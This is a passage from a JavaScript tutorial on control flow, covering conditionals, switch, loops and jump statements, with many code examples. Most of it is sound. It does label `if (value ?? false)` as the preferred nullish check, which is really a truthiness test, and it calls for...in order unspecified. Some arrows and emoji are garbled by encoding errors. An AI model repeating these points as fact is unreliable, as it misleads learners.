let obj2 = obj1;
obj1.x = 10;
console.log(obj2.x);  // ?
```

<details>
<summary>Solution</summary>

```javascript
// Primitives are copied by value
let a = 5;      // a holds value 5
let b = a;      // b gets a COPY of value 5
a = 10;         // a changes, b is independent
console.log(b); // 5 (unchanged)

// Objects are copied by reference
let obj1 = { x: 5 };  // obj1 holds reference to object
let obj2 = obj1;       // obj2 gets same reference (not a copy!)
obj1.x = 10;           // Modifies the shared object
console.log(obj2.x);   // 10 (obj1 and obj2 point to same object)
```
</details>

---

**End of Chapter 1: Language Fundamentals**

With these fundamentals internalized, you're ready to tackle functions, objects, and the advanced features built upon this foundation.


# 02-Control-Flow.md

# 2 Control Flow

Control flow determines the order in which statements execute. JavaScript provides conditionals (`if`, `switch`), loops (`for`, `while`, `for...of`), jump statements (`break`, `continue`, `return`), and exception handling (`try...catch...finally`).

This chapter builds on the statement fundamentals from Chapter 1.6, diving deeper into patterns, edge cases, and best practices for controlling program execution.

---

## 2.1 Conditional Statements

### 2.1.1 `if` Statement

### Basic Syntax

```javascript
if (condition) {
  // Execute if condition is truthy
}
```

**Example:**

```javascript
let age = 20;

if (age >= 18) {
  console.log("Adult");
}
```

---

### Truthiness in Conditions

The condition is **coerced to boolean**:

```javascript
// Truthy values
if (1) { }              // Executes
if ("hello") { }        // Executes
if ([]) { }             // Executes (arrays are truthy!)
if ({}) { }             // Executes (objects are truthy!)

// Falsy values (8 total)
if (false) { }          // Doesn't execute
if (0) { }              // Doesn't execute
if (-0) { }             // Doesn't execute
if (0n) { }             // Doesn't execute
if ("") { }             // Doesn't execute
if (null) { }           // Doesn't execute
if (undefined) { }      // Doesn't execute
if (NaN) { }            // Doesn't execute
```

**Common mistakes:**

```javascript
// Wrong: Checking if array/object exists
let arr = [];
if (arr) {
  // Always executes! Arrays are truthy even when empty
}

// Correct: Check length
if (arr.length) {
  // Executes only if array has elements
}

// Wrong: Checking if string is "0" or "false"
let str = "0";
if (str) {
  // Executes! Non-empty strings are truthy
}

// Correct: Explicit comparison
if (str !== "0") { }
```

---

### Block Statements

**With braces (recommended):**

```javascript
if (condition) {
  statement1;
  statement2;
}
```

**Without braces (single statement):**

```javascript
if (condition)
  statement;

// Dangerous: easy to introduce bugs
if (condition)
  statement1;
  statement2;  // Always executes! Not part of if
```

**Always use braces:**

```javascript
// Bad
if (x > 0)
  console.log("positive");

// Good
if (x > 0) {
  console.log("positive");
}
```

---

### `if...else`

```javascript
if (condition) {
  // Execute if truthy
} else {
  // Execute if falsy
}
```

**Example:**

```javascript
let age = 15;

if (age >= 18) {
  console.log("Adult");
} else {
  console.log("Minor");
}
```

---

### `else if` Chains

```javascript
if (condition1) {
  // Execute if condition1 is truthy
} else if (condition2) {
  // Execute if condition2 is truthy
} else if (condition3) {
  // Execute if condition3 is truthy
} else {
  // Execute if all conditions are falsy
}
```

**Example:**

```javascript
let score = 85;

if (score >= 90) {
  console.log("A");
} else if (score >= 80) {
  console.log("B");
} else if (score >= 70) {
  console.log("C");
} else if (score >= 60) {
  console.log("D");
} else {
  console.log("F");
}
```

**Order matters (first match wins):**

```javascript
let x = 50;

// Wrong order
if (x > 0) {
  console.log("positive");  // This executes
} else if (x > 25) {
  console.log("greater than 25");  // Never reached!
}

// Correct order (most specific first)
if (x > 25) {
  console.log("greater than 25");
} else if (x > 0) {
  console.log("positive");
}
```

---

### Dangling `else` Problem

**Ambiguous `else` binding:**

```javascript
// Misleading indentation
if (x > 0)
  if (y > 0)
    console.log("both positive");
else  // Which if does this belong to?
  console.log("x not positive?");

// Actually binds to the inner if!
// Equivalent to:
if (x > 0) {
  if (y > 0) {
    console.log("both positive");
  } else {
    console.log("y not positive");
  }
}
```

**Solution: Always use braces:**

```javascript
if (x > 0) {
  if (y > 0) {
    console.log("both positive");
  }
} else {
  console.log("x not positive");
}
```

---

### Nested Conditionals

**Flatten when possible:**

```javascript
// Nested (hard to read)
if (user) {
  if (user.isActive) {
    if (user.hasPermission) {
      processUser(user);
    }
  }
}

// Guard clauses (better)
if (!user) return;
if (!user.isActive) return;
if (!user.hasPermission) return;

processUser(user);

// Or combine conditions
if (user && user.isActive && user.hasPermission) {
  processUser(user);
}

// Or use optional chaining
if (user?.isActive && user?.hasPermission) {
  processUser(user);
}
```

---

### Assignment in Conditions (Common Bug)

```javascript
let x = 5;

// Bug: Assignment instead of comparison
if (x = 10) {  // Assigns 10 to x, evaluates to 10 (truthy)
  console.log("This always runs");
  console.log(x);  // 10
}

// Correct: Comparison
if (x === 10) {
  console.log("x is 10");
}
```

**Intentional assignment (Yoda conditions prevent this):**

```javascript
// Intentional assignment
let match;
if (match = str.match(/pattern/)) {
  console.log("Found:", match);
}

// Prevent accidental assignment with Yoda condition
if (10 === x) {  // Can't accidentally write 10 = x
  console.log("x is 10");
}
```

**Use linters to catch this:**

```javascript
// ESLint rule: no-cond-assign
if (x = 10) {  // Warning: Expected a conditional expression
  // ...
}
```

---

### 2.1.2 Ternary Operator

### Basic Syntax

```javascript
condition ? valueIfTrue : valueIfFalse
```

**Example:**

```javascript
let age = 20;
let status = age >= 18 ? "adult" : "minor";
console.log(status);  // "adult"
```

---

### When to Use

**Good use cases:**

```javascript
// Simple conditional assignment
let max = a > b ? a : b;

// Inline rendering (React)
{isLoggedIn ? <Dashboard /> : <Login />}

// Default values (though ?? is better)
let name = user.name ? user.name : "Anonymous";
let name = user.name ?? "Anonymous";  // Better

// Simple conditional expressions
console.log(x > 0 ? "positive" : "negative");
```

**Avoid for:**

```javascript
// Complex logic (use if...else)
let result = condition1 ? (
  condition2 ? value1 : value2
) : (
  condition3 ? value3 : value4
);  // Hard to read

// Side effects (confusing)
x > 0 ? doThis() : doThat();  // Use if...else instead

// Multiple statements
x > 0 ? (a++, b++, c++) : (x++, y++, z++);  // Confusing
```

---

### Nested Ternary

**Single level (acceptable):**

```javascript
let grade = score >= 90 ? "A" :
            score >= 80 ? "B" :
            score >= 70 ? "C" : "F";
```

**Multiple levels (avoid):**

```javascript
// Unreadable
let result = a ? b ? c ? d : e : f : g ? h : i;

// Better: use if...else
let result;
if (a) {
  if (b) {
    result = c ? d : e;
  } else {
    result = f;
  }
} else {
  result = g ? h : i;
}
```

---

### Ternary vs Logical Operators

```javascript
// Ternary
let result = condition ? value : defaultValue;

// Logical OR (shorter for defaults)
let result = value || defaultValue;

// But beware of falsy values
let count = userCount || 0;  // Wrong if userCount is 0
let count = userCount ?? 0;  // Correct: only null/undefined

// Ternary is explicit
let count = userCount !== null && userCount !== undefined ? userCount : 0;
```

---

### Operator Precedence

```javascript
// Assignment has lower precedence
let result = x > 0 ? 1 : 0;  // OK

// But watch out for complex expressions
let result = x > 0 ? y = 1 : y = 0;  // Assignment in ternary
let result = (x > 0 ? y : z) = 1;    // SyntaxError

// Use parentheses for clarity
let result = x > 0 ? (a + b) : (c + d);
```

---

### 2.1.3 `switch` Statement

### Basic Syntax

```javascript
switch (expression) {
  case value1:
    // Execute if expression === value1
    break;
  case value2:
    // Execute if expression === value2
    break;
  default:
    // Execute if no case matches
}
```

**Example:**

```javascript
let day = 2;

switch (day) {
  case 0:
    console.log("Sunday");
    break;
  case 1:
    console.log("Monday");
    break;
  case 2:
    console.log("Tuesday");
    break;
  default:
    console.log("Unknown");
}
// "Tuesday"
```

---

### Strict Equality Comparison

`switch` uses **strict equality (`===`)**:

```javascript
let x = "10";

switch (x) {
  case 10:  // Doesn't match (number vs string)
    console.log("number 10");
    break;
  case "10":  // Matches
    console.log("string 10");
    break;
}
// "string 10"
```

---

### Fall-Through Behavior

**Without `break`, execution continues to next case:**

```javascript
let x = 1;

switch (x) {
  case 1:
    console.log("one");
    // No break! Falls through
  case 2:
    console.log("two");
    // No break! Falls through
  case 3:
    console.log("three");
    break;
}
// Logs: "one", "two", "three"
```

**Intentional fall-through (document it):**

```javascript
let month = 2;

switch (month) {
  case 1:
  case 3:
  case 5:
  case 7:
  case 8:
  case 10:
  case 12:
    console.log("31 days");
    break;
  case 4:
  case 6:
  case 9:
  case 11:
    console.log("30 days");
    break;
  case 2:
    console.log("28 or 29 days");
    break;
}
```

**Comment intentional fall-through:**

```javascript
switch (value) {
  case 1:
    doSomething();
    // falls through
  case 2:
    doSomethingElse();
    break;
}
```

---

### `default` Case

**Optional but recommended:**

```javascript
switch (value) {
  case 1:
    console.log("one");
    break;
  case 2:
    console.log("two");
    break;
  default:
    console.log("other");
}
```

**Position doesn't matter (but put at end by convention):**

```javascript
// Default at beginning (unusual but valid)
switch (value) {
  default:
    console.log("default");
    break;
  case 1:
    console.log("one");
    break;
}
```

**`default` with fall-through:**

```javascript
switch (value) {
  case 1:
  case 2:
  case 3:
    console.log("1, 2, or 3");
    break;
  default:
    console.log("other");
    // No break needed (last case)
}
```

---

### Block Scope in Cases

**Single block scope for entire switch:**

```javascript
switch (value) {
  case 1:
    let x = 10;  // Declared in switch block
    break;
  case 2:
    let x = 20;  // SyntaxError: x already declared
    break;
}
```

**Solution: Use block in each case:**

```javascript
switch (value) {
  case 1: {
    let x = 10;
    console.log(x);
    break;
  }
  case 2: {
    let x = 20;  // OK: different block scope
    console.log(x);
    break;
  }
}
```

---

### Expressions in Cases

**Cases can be expressions:**

```javascript
let x = 5;

switch (true) {
  case x > 0:
    console.log("positive");
    break;
  case x < 0:
    console.log("negative");
    break;
  default:
    console.log("zero");
}
```

**Dynamic case values:**

```javascript
const MIN = 0;
const MAX = 100;

switch (value) {
  case MIN:
    console.log("minimum");
    break;
  case MAX:
    console.log("maximum");
    break;
}
```

---

### Return in Switch

**Can return directly (no break needed):**

```javascript
function getDayName(day) {
  switch (day) {
    case 0: return "Sunday";
    case 1: return "Monday";
    case 2: return "Tuesday";
    case 3: return "Wednesday";
    case 4: return "Thursday";
    case 5: return "Friday";
    case 6: return "Saturday";
    default: return "Invalid";
  }
}
```

---

### `switch` vs `if...else`

**Use `switch` when:**

- Multiple discrete values to check
- Same variable/expression tested
- Fall-through behavior needed

```javascript
// Good use of switch
switch (status) {
  case "pending":
    processPending();
    break;
  case "approved":
    processApproved();
    break;
  case "rejected":
    processRejected();
    break;
}
```

**Use `if...else` when:**

- Complex conditions
- Range checks
- Different variables tested
- Boolean logic needed

```javascript
// Better as if...else
if (age < 18) {
  console.log("minor");
} else if (age >= 18 && age < 65) {
  console.log("adult");
} else {
  console.log("senior");
}
```

---

### Object Lookup Alternative

**Instead of switch:**

```javascript
switch (action) {
  case "add":
    return a + b;
  case "subtract":
    return a - b;
  case "multiply":
    return a * b;
  case "divide":
    return a / b;
}
```

**Use object lookup:**

```javascript
const operations = {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b,
  divide: (a, b) => a / b
};

return operations[action]?.(a, b);
```

**Or Map:**

```javascript
const operations = new Map([
  ["add", (a, b) => a + b],
  ["subtract", (a, b) => a - b],
  ["multiply", (a, b) => a * b],
  ["divide", (a, b) => a / b]
]);

return operations.get(action)?.(a, b);
```

---

### 2.1.4 Common Patterns and Best Practices

### Guard Clauses

**Early returns to reduce nesting:**

```javascript
// Deeply nested
function processUser(user) {
  if (user) {
    if (user.isActive) {
      if (user.hasPermission) {
        // Process user
        return user.data;
      } else {
        return null;
      }
    } else {
      return null;
    }
  } else {
    return null;
  }
}

// Guard clauses (better)
function processUser(user) {
  if (!user) return null;
  if (!user.isActive) return null;
  if (!user.hasPermission) return null;
  
  // Process user
  return user.data;
}
```

---

### Null/Undefined Checks

**Explicit null check:**

```javascript
if (value === null) { }
if (value === undefined) { }
if (value === null || value === undefined) { }

// Loose equality (checks both)
if (value == null) { }  // Matches null or undefined

// Nullish check (preferred)
if (value ?? false) { }
```

**Optional chaining:**

```javascript
// Old way
if (user && user.profile && user.profile.name) {
  console.log(user.profile.name);
}

// Optional chaining
if (user?.profile?.name) {
  console.log(user.profile.name);
}

// With nullish coalescing
const name = user?.profile?.name ?? "Anonymous";
```

---

### Boolean Conditions

**Don't compare to true/false:**

```javascript
// Bad
if (isActive === true) { }
if (isActive === false) { }

// Good
if (isActive) { }
if (!isActive) { }
```

**Exception: Checking for exact boolean:**

```javascript
// When value might be truthy but not true
let value = "hello";

if (value) { }       // true (truthy)
if (value === true) { }  // false (not boolean true)
```

---

### Type Checking

**Check type before operations:**

```javascript
// Defensive
function processString(str) {
  if (typeof str !== "string") {
    throw new TypeError("Expected string");
  }
  
  return str.toUpperCase();
}

// With default
function processString(str = "") {
  if (typeof str !== "string") {
    str = String(str);
  }
  
  return str.toUpperCase();
}
```

---

### Logical Operators in Conditions

**Short-circuit evaluation:**

```javascript
// Execute only if user exists
user && user.login();

// Default value
let name = user.name || "Anonymous";

// Nullish coalescing (better for 0, "", false)
let count = userCount ?? 0;
```

**Combining conditions:**

```javascript
// AND
if (user && user.isActive && user.hasPermission) { }

// OR
if (isAdmin || isModerator || isOwner) { }

// Mixed
if ((isAdmin || isModerator) && hasPermission) { }
```

---

### Switch Statement Best Practices

1. **Always include `default`** (even if just error handling)
2. **Always use `break`** (unless intentional fall-through)
3. **Comment intentional fall-through**
4. **Use blocks for `let`/`const` in cases**
5. **Consider object lookup for complex switches**

---

### Readability Guidelines

**Positive conditions first:**

```javascript
// Harder to read
if (!user.isInactive) {
  processUser(user);
}

// Easier to read
if (user.isActive) {
  processUser(user);
}
```

**Extract complex conditions:**

```javascript
// Hard to read
if (user.age >= 18 && user.hasLicense && !user.isSuspended && user.passedTest) {
  allowDriving(user);
}

// Better: Extract to variable
const canDrive = user.age >= 18 && 
                 user.hasLicense && 
                 !user.isSuspended && 
                 user.passedTest;

if (canDrive) {
  allowDriving(user);
}

// Or extract to function
function canUserDrive(user) {
  return user.age >= 18 && 
         user.hasLicense && 
         !user.isSuspended && 
         user.passedTest;
}

if (canUserDrive(user)) {
  allowDriving(user);
}
```

---

### 2.1.5 Performance Considerations

### Short-Circuit Evaluation

**Logical operators stop at first determinant:**

```javascript
// && stops at first falsy
false && expensiveOperation();  // expensiveOperation not called

// || stops at first truthy
true || expensiveOperation();   // expensiveOperation not called

// Put cheap checks first
if (cheapCheck() && expensiveCheck()) { }
```

---

### Switch vs If-Else Performance

**For many cases, switch can be faster:**

```javascript
// Many if-else (linear search)
if (x === 1) { }
else if (x === 2) { }
else if (x === 3) { }
// ... 100 more cases

// Switch (can be optimized to jump table)
switch (x) {
  case 1: break;
  case 2: break;
  case 3: break;
  // ... 100 more cases
}
```

**But modern engines optimize both well. Prefer readability.**

---

### 2.1.6 Summary

### Conditional Statement Comparison

|Feature|`if...else`|Ternary|`switch`|
|---|---|---|---|
|**Complexity**|Any|Simple|Discrete values|
|**Returns value**|No (statement)|Yes (expression)|No (statement)|
|**Fall-through**|No|No|Yes (with care)|
|**Readability**|Best for complex|Best for simple|Best for many cases|
|**Type check**|Coerces to boolean|Coerces to boolean|Strict equality|

---

### Best Practices

1. **Always use braces** for `if` blocks (even single statement)
2. **Use guard clauses** to reduce nesting
3. **Prefer positive conditions** for readability
4. **Extract complex conditions** to variables/functions
5. **Use ternary only for simple assignments**
6. **Include `default` in switch statements**
7. **Document intentional fall-through**
8. **Use optional chaining** for null checks
9. **Prefer nullish coalescing (`??`)** over OR (`||`) for defaults
10. **Choose the right tool**: `if` for complex, ternary for simple, switch for many discrete cases

---

### Key Takeaways

- **8 falsy values**: `false`, `0`, `-0`, `0n`, `""`, `null`, `undefined`, `NaN`
- **Empty arrays/objects are truthy**
- **`switch` uses strict equality (`===`)**
- **Fall-through requires explicit `break`**
- **Guard clauses reduce nesting**
- **Optional chaining simplifies null checks**
- **Ternary is an expression**, `if`/`switch` are statements
- **Readability > cleverness**

---

Next: Loops (for, while, for-in, for-of, for await...of).

## 2.2 Loops

### 2.2.1 `for` Loop

### Basic Syntax

```javascript
for (initialization; condition; increment) {
  // Body executes while condition is truthy
}
```

**Example:**

```javascript
for (let i = 0; i < 5; i++) {
  console.log(i);
}
// 0, 1, 2, 3, 4
```

---

### Execution Order

```javascript
// 1. initialization (once)
// 2. condition check
// 3. body (if condition true)
// 4. increment
// 5. goto step 2

for (let i = 0; i < 3; i++) {
  console.log(i);
}

// Execution:
// i = 0 (initialization)
// i < 3? true â†’ console.log(0) â†’ i++ â†’ i = 1
// i < 3? true â†’ console.log(1) â†’ i++ â†’ i = 2
// i < 3? true â†’ console.log(2) â†’ i++ â†’ i = 3
// i < 3? false â†’ exit loop
```

---

### Parts Are Optional

**All parts optional:**

```javascript
// Infinite loop
for (;;) {
  // Runs forever (use break to exit)
}
```

**Initialization outside:**

```javascript
let i = 0;
for (; i < 5; i++) {
  console.log(i);
}
```

**Increment in body:**

```javascript
for (let i = 0; i < 5;) {
  console.log(i);
  i++;
}
```

**Multiple statements in increment:**

```javascript
for (let i = 0, j = 10; i < j; i++, j--) {
  console.log(i, j);
}
// 0 10
// 1 9
// 2 8
// 3 7
// 4 6
```

---

### `let` vs `var` in Loops

**`let` creates per-iteration binding:**

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 0, 1, 2 (each iteration has its own i)
```

**`var` has single binding:**

```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 3, 3, 3 (all closures reference same i)
```

**How `let` works internally:**

```javascript
// Conceptually:
{
  let i = 0;
  {
    let i_iteration0 = i;
    setTimeout(() => console.log(i_iteration0), 100);
  }
  i++;
  {
    let i_iteration1 = i;
    setTimeout(() => console.log(i_iteration1), 100);
  }
  i++;
  // etc.
}
```

---

### Common Patterns

**Iterate array:**

```javascript
let arr = [10, 20, 30];

for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}
```

**Reverse iteration:**

```javascript
for (let i = arr.length - 1; i >= 0; i--) {
  console.log(arr[i]);
}
// 30, 20, 10
```

**Step by 2:**

```javascript
for (let i = 0; i < 10; i += 2) {
  console.log(i);
}
// 0, 2, 4, 6, 8
```

**Nested loops:**

```javascript
for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    console.log(i, j);
  }
}
```

---

### 2.2.2 `while` Loop

### Basic Syntax

```javascript
while (condition) {
  // Execute while condition is truthy
}
```

**Example:**

```javascript
let i = 0;
while (i < 5) {
  console.log(i);
  i++;
}
// 0, 1, 2, 3, 4
```

---

### Execution Order

```javascript
// 1. Check condition
// 2. Execute body (if condition true)
// 3. Goto step 1

let i = 0;
while (i < 3) {
  console.log(i);
  i++;
}

// Execution:
// i < 3? true â†’ console.log(0) â†’ i++ â†’ i = 1
// i < 3? true â†’ console.log(1) â†’ i++ â†’ i = 2
// i < 3? true â†’ console.log(2) â†’ i++ â†’ i = 3
// i < 3? false â†’ exit
```

---

### When to Use

**Use when:**

- Number of iterations unknown
- Iteration depends on complex condition
- More readable than `for` for the use case

```javascript
// Reading file line by line
let line;
while ((line = readLine()) !== null) {
  processLine(line);
}

// Waiting for condition
while (!isReady) {
  wait();
}

// Processing queue
while (queue.length > 0) {
  processItem(queue.shift());
}
```

---

### Infinite Loop

```javascript
while (true) {
  // Runs forever
  if (shouldExit) break;
}
```

---

### 2.2.3 `do...while` Loop

### Basic Syntax

```javascript
do {
  // Execute at least once
} while (condition);
```

**Example:**

```javascript
let i = 0;
do {
  console.log(i);
  i++;
} while (i < 5);
// 0, 1, 2, 3, 4
```

---

### Executes At Least Once

```javascript
let i = 10;

// while: doesn't execute
while (i < 5) {
  console.log(i);  // Never runs
}

// do-while: executes once
do {
  console.log(i);  // Logs 10
} while (i < 5);
```

---

### When to Use

**Menu-driven programs:**

```javascript
let choice;
do {
  choice = showMenu();
  processChoice(choice);
} while (choice !== "quit");
```

**Input validation:**

```javascript
let input;
do {
  input = prompt("Enter a number between 1 and 10:");
} while (input < 1 || input > 10);
```

---

### 2.2.4 `for...in` Loop

### Basic Syntax

```javascript
for (variable in object) {
  // Iterate over enumerable properties
}
```

**Example:**

```javascript
let obj = { a: 1, b: 2, c: 3 };

for (let key in obj) {
  console.log(key, obj[key]);
}
// "a" 1
// "b" 2
// "c" 3
```

---

### Enumerates Properties

**Includes inherited properties:**

```javascript
let parent = { inherited: true };
let child = Object.create(parent);
child.own = true;

for (let key in child) {
  console.log(key);
}
// "own"
// "inherited"
```

**Filter own properties:**

```javascript
for (let key in child) {
  if (child.hasOwnProperty(key)) {
    console.log(key);  // Only "own"
  }
}

// Or use Object.keys (own properties only)
for (let key of Object.keys(child)) {
  console.log(key);  // Only "own"
}
```

---

### Arrays (Don't Use)

**Iterates indices as strings:**

```javascript
let arr = [10, 20, 30];

for (let index in arr) {
  console.log(typeof index);  // "string"
  console.log(index, arr[index]);
}
// "0" 10
// "1" 20
// "2" 30
```

**Problems:**

1. Indices are strings (not numbers)
2. Iterates all enumerable properties (including added ones)
3. Order not guaranteed (though usually is)

```javascript
let arr = [10, 20, 30];
arr.custom = "value";

for (let index in arr) {
  console.log(index, arr[index]);
}
// "0" 10
// "1" 20
// "2" 30
// "custom" "value"  â† included!
```

**Use `for...of` for arrays:**

```javascript
for (let value of arr) {
  console.log(value);
}
// 10, 20, 30 (no "custom")
```

---

### Order of Iteration

**Generally:**

1. Integer keys in ascending order
2. String keys in creation order
3. Symbol keys (not enumerated by `for...in`)

**But order is not guaranteed by spec (though implementations are consistent).**

---

### 2.2.5 `for...of` Loop

### Basic Syntax

```javascript
for (variable of iterable) {
  // Iterate over values
}
```

**Example:**

```javascript
let arr = [10, 20, 30];

for (let value of arr) {
  console.log(value);
}
// 10, 20, 30
```

---

### Works with Iterables

**Arrays:**

```javascript
for (let item of [1, 2, 3]) {
  console.log(item);
}
```

**Strings:**

```javascript
for (let char of "hello") {
  console.log(char);
}
// "h", "e", "l", "l", "o"

// Handles Unicode correctly
for (let char of "ðŸ˜€ðŸŽ‰") {
  console.log(char);
}
// "ðŸ˜€", "ðŸŽ‰"
```

**Sets:**

```javascript
let set = new Set([1, 2, 3]);
for (let value of set) {
  console.log(value);
}
// 1, 2, 3
```

**Maps:**

```javascript
let map = new Map([["a", 1], ["b", 2]]);

for (let [key, value] of map) {
  console.log(key, value);
}
// "a" 1
// "b" 2

// Just keys
for (let key of map.keys()) {
  console.log(key);
}

// Just values
for (let value of map.values()) {
  console.log(value);
}
```

**Typed Arrays:**

```javascript
let arr = new Uint8Array([1, 2, 3]);
for (let value of arr) {
  console.log(value);
}
```

---

### Not for Plain Objects

**Objects are not iterable:**

```javascript
let obj = { a: 1, b: 2 };

for (let value of obj) {  // TypeError: obj is not iterable
  console.log(value);
}
```

**Solutions:**

```javascript
// Iterate keys
for (let key of Object.keys(obj)) {
  console.log(key, obj[key]);
}

// Iterate values
for (let value of Object.values(obj)) {
  console.log(value);
}

// Iterate entries
for (let [key, value] of Object.entries(obj)) {
  console.log(key, value);
}
```

---

### Destructuring in `for...of`

```javascript
let arr = [[1, 2], [3, 4], [5, 6]];

for (let [a, b] of arr) {
  console.log(a, b);
}
// 1 2
// 3 4
// 5 6

let users = [
  { name: "Alice", age: 30 },
  { name: "Bob", age: 25 }
];

for (let { name, age } of users) {
  console.log(name, age);
}
// "Alice" 30
// "Bob" 25
```

---

### Custom Iterables

**Implement `Symbol.iterator`:**

```javascript
let range = {
  from: 1,
  to: 5,
  
  [Symbol.iterator]() {
    return {
      current: this.from,
      last: this.to,
      
      next() {
        if (this.current <= this.last) {
          return { value: this.current++, done: false };
        } else {
          return { done: true };
        }
      }
    };
  }
};

for (let num of range) {
  console.log(num);
}
// 1, 2, 3, 4, 5
```

**Generator function (easier):**

```javascript
let range = {
  from: 1,
  to: 5,
  
  *[Symbol.iterator]() {
    for (let value = this.from; value <= this.to; value++) {
      yield value;
    }
  }
};

for (let num of range) {
  console.log(num);
}
// 1, 2, 3, 4, 5
```

---

### 2.2.6 `for await...of` Loop

### Basic Syntax

```javascript
for await (variable of asyncIterable) {
  // Iterate over async values
}
```

**Must be in async context:**

```javascript
async function process() {
  for await (let value of asyncIterable) {
    console.log(value);
  }
}
```

---

### Async Iterables

**Async generators:**

```javascript
async function* asyncGenerator() {
  yield await Promise.resolve(1);
  yield await Promise.resolve(2);
  yield await Promise.resolve(3);
}

(async () => {
  for await (let value of asyncGenerator()) {
    console.log(value);
  }
})();
// 1 (after delay)
// 2 (after delay)
// 3 (after delay)
```

**Custom async iterable:**

```javascript
let asyncRange = {
  from: 1,
  to: 3,
  
  [Symbol.asyncIterator]() {
    return {
      current: this.from,
      last: this.to,
      
      async next() {
        await delay(100);  // Simulate async operation
        
        if (this.current <= this.last) {
          return { value: this.current++, done: false };
        } else {
          return { done: true };
        }
      }
    };
  }
};

(async () => {
  for await (let num of asyncRange) {
    console.log(num);
  }
})();
```

---

### Streams and Async Iteration

**ReadableStream:**

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

// Manual iteration
while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  processChunk(value);
}

// With async iteration (Node.js Streams)
for await (const chunk of stream) {
  processChunk(chunk);
}
```

---

### Error Handling

```javascript
async function* asyncGen() {
  yield 1;
  throw new Error("Error at 2");
  yield 3;  // Never reached
}

(async () => {
  try {
    for await (let value of asyncGen()) {
      console.log(value);
    }
  } catch (error) {
    console.error(error.message);  // "Error at 2"
  }
})();
```

---

### 2.2.7 Loop Control Best Practices

### Avoid Modifying Loop Variable

**Bad:**

```javascript
for (let i = 0; i < 10; i++) {
  if (condition) {
    i += 5;  // Confusing
  }
}
```

**Good:**

```javascript
for (let i = 0; i < 10; i++) {
  if (condition) {
    break;  // Or continue
  }
}
```

---

### Cache Length in Performance-Critical Loops

**If length doesn't change:**

```javascript
// Recalculates length each iteration
for (let i = 0; i < arr.length; i++) { }

// Cache length (micro-optimization, usually not needed)
for (let i = 0, len = arr.length; i < len; i++) { }
```

**Modern engines optimize this, so prefer readability.**

---

### Prefer `for...of` for Arrays

**More readable:**

```javascript
// Traditional for
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// for...of (better)
for (let item of arr) {
  console.log(item);
}
```

**When you need index:**

```javascript
// entries() provides index
for (let [index, item] of arr.entries()) {
  console.log(index, item);
}

// Or forEach
arr.forEach((item, index) => {
  console.log(index, item);
});
```

---

### Loop Choice Flowchart

1. **Iterating array/iterable?** â†’ `for...of`
2. **Iterating object properties?** â†’ `Object.keys/values/entries` + `for...of`
3. **Need index in array?** â†’ `array.entries()` or traditional `for`
4. **Unknown iterations (condition-based)?** â†’ `while`
5. **Guaranteed at least once?** â†’ `do...while`
6. **Async iteration?** â†’ `for await...of`

---
## 2.3 Jump Statements

### 2.3.1 `break` Statement

### Exit Loop

```javascript
for (let i = 0; i < 10; i++) {
  if (i === 5) break;
  console.log(i);
}
// 0, 1, 2, 3, 4
```

---

### Exit Switch

```javascript
switch (value) {
  case 1:
    console.log("one");
    break;  // Exit switch
  case 2:
    console.log("two");
    break;
}
```

---

### Labeled `break`

**Break outer loop:**

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (i === 1 && j === 1) break outer;
    console.log(i, j);
  }
}
// 0 0, 0 1, 0 2, 1 0
```

**Break block:**

```javascript
myBlock: {
  console.log("before");
  if (condition) break myBlock;
  console.log("after");  // Skipped if condition true
}
console.log("outside");
```

---

### Common Patterns

**Search with early exit:**

```javascript
let found = false;
for (let item of arr) {
  if (item === target) {
    found = true;
    break;
  }
}

// Or use Array.includes/find
let found = arr.includes(target);
let item = arr.find(x => x === target);
```

**Process until condition:**

```javascript
while (true) {
  let item = queue.shift();
  if (!item) break;
  processItem(item);
}
```

---

### 2.3.2 `continue` Statement

### Skip to Next Iteration

```javascript
for (let i = 0; i < 5; i++) {
  if (i === 2) continue;
  console.log(i);
}
// 0, 1, 3, 4
```

---

### In Different Loops

**`for` loop:**

```javascript
for (let i = 0; i < 5; i++) {
  if (i % 2 === 0) continue;
  console.log(i);  // Odd numbers only
}
// 1, 3
```

**`while` loop:**

```javascript
let i = 0;
while (i < 5) {
  i++;
  if (i % 2 === 0) continue;
  console.log(i);  // Odd numbers only
}
// 1, 3, 5
```

**`for...of` loop:**

```javascript
for (let item of arr) {
  if (item < 0) continue;
  console.log(item);  // Positive numbers only
}
```

---

### Labeled `continue`

```javascript
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (j === 1) continue outer;
    console.log(i, j);
  }
}
// 0 0, 1 0, 2 0
```

---

### Common Patterns

**Skip invalid items:**

```javascript
for (let user of users) {
  if (!user.isActive) continue;
  processUser(user);
}
```

**Filter in loop:**

```javascript
for (let value of values) {
  if (value < min || value > max) continue;
  result.push(value);
}

// Better: use filter
let result = values.filter(v => v >= min && v <= max);
```

---

### 2.3.3 `return` Statement

### Exit Function

```javascript
function add(a, b) {
  return a + b;
}

let result = add(5, 3);  // 8
```

---

### Early Return (Guard Clauses)

```javascript
function processUser(user) {
  if (!user) return null;
  if (!user.isActive) return null;
  if (!user.hasPermission) return null;
  
  // Process user
  return user.data;
}
```

---

### Multiple Return Points

**Readable for guard clauses:**

```javascript
function validateInput(input) {
  if (typeof input !== "string") {
    return { valid: false, error: "Must be string" };
  }
  
  if (input.length < 3) {
    return { valid: false, error: "Too short" };
  }
  
  if (input.length > 100) {
    return { valid: false, error: "Too long" };
  }
  
  return { valid: true };
}
```

**Avoid when confusing:**

```javascript
// Hard to follow
function complex(x) {
  if (x > 0) {
    if (x < 10) {
      return "small";
    } else {
      if (x < 100) {
        return "medium";
      } else {
        return "large";
      }
    }
  } else {
    return "negative";
  }
}

// Better: single return
function complex(x) {
  let result;
  
  if (x < 0) {
    result = "negative";
  } else if (x < 10) {
    result = "small";
  } else if (x < 100) {
    result = "medium";
  } else {
    result = "large";
  }
  
  return result;
}
```

---

### Arrow Function Returns

**Implicit return (single expression):**

```javascript
const add = (a, b) => a + b;

const double = x => x * 2;
```

